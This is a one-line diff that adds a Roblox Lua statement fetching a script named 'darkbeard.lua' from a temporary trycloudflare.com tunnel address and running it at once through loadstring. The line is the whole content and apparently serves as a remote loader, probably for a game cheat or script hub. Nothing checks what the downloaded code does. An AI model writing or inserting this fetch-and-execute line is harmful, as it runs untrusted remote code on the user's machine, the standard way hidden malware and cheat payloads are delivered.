@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://parameter-eddie-distant-objective.trycloudflare.com/trackcaythue/darkbeard.lua"))()
